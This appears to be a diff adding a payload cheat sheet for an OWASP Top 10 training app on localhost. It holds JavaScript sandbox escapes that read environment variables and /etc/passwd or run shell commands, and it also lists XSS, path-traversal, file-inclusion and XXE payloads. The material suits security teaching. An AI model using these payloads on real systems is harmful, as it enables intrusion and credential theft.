@@ -1,0 +1,66 @@
+///////////////////////
+// 		A10 Information disclosure
+///////////////////////
+
+1 stack trace disclosure)   "aaa"
+2 header disclosure)        app.disable('x-powered-by');
+
+///////////////////////
+// 		A9 Using Components
+///////////////////////
+
+1) cos.constructor(\"return 1\")()
+2) cos.constructor(\"return process.env\")()
+3) cos.constructor(\"Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer\")()
+
+process.cwd()
+var fs=require("fs");fs.readdirSync("/app.js").toString('utf8')
+require('child_process').exec('whoami')
+
+///////////////////////
+// 		A8 Using Components
+///////////////////////
+
+1) Serialization
+
+///////////////////////
+// 		A7 XSS
+///////////////////////
+
+1 reflection ) 		http://127.0.0.1:3000/api/xss/stage/1?search=aaaaaaa%3Cscript%3Ealert(1)%3C/script%3E
+2 none reflection) 	http://127.0.0.1:3000/api/xss/stage/1?search=aaaaaaa%3Cscript%3Ealert(1)%3C/script%3E
+
+3 ejs ) 			http://127.0.0.1:3000/a7/stage/3?search=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%3Cspan+id%3D%221
+4 json) 			http://127.0.0.1:3000/api/xss/stage/4?search=aaaaaaaa&country=IL<svg/onload=alert(1)>
+5 dom )				http://127.0.0.1:3000/a7/stage/5#%3Cscript%3Ealert(1)%3C/script%3E
+6 a href )			http://127.0.0.1:3000/a7/stage/6?search=javascript%3Aalert%281%29
+
+7 redirect )		http://127.0.0.1:3000/redirect?url=https://www.rzcyber.com
+7 xss )				http://127.0.0.1:3000/a7/stage/7?callback=http://127.0.0.1:3000/a7/stage/7_real?search=%3Cscript%3Ealert(1)%3C/script%3E
+
+8 csp )				alert(1);
+					<script src="/uploads/first.js"></script>
+
+///////////////////////
+// 		A6 Using Components
+///////////////////////
+
+1) CORS
+2) CSRF
+3) CSRF with Cookie
+4) CSRF with Token
+
+///////////////////////
+//		A5 Broken Access Control
+///////////////////////
+http://127.0.0.1:3000/file_inclusion/stage/1?file=../../app.js
+http://127.0.0.1:3000/file_inclusion/stage/2?file=http://127.0.0.1:3000/api/secret
+
+///////////////////////
+//		A4
+///////////////////////
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r [ <!ELEMENT r ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+<creds><user>&xxe;</user><pass>asdasd</pass></creds>
+
+
